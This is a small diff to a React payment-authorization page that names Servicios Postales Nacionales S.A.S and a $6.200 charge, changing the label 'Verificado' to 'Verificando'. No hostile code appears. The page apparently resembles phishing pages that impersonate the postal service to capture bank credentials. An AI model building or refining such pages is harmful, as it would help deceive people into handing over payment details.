@@ -27,7 +27,7 @@ const Final = () => {
   return (
     <>
         <div className='fondoAmarillo p-5'>
-            <p className='uppercase cosoAzul'>Verificado</p>
+            <p className='uppercase cosoAzul'>Verificando</p>
             <p className='cosoAzul2'>Autorización de transacción</p>
             <p>La transacción que intetas realizar con <span className='cosoAzul2'>Servicios Postales Nacionales S.A.S</span> por valor de $6.200 puede requerir autorización ante su entidad bancaria.</p>
             <p className='cosoAzul2'>Detalles de transacción</p>
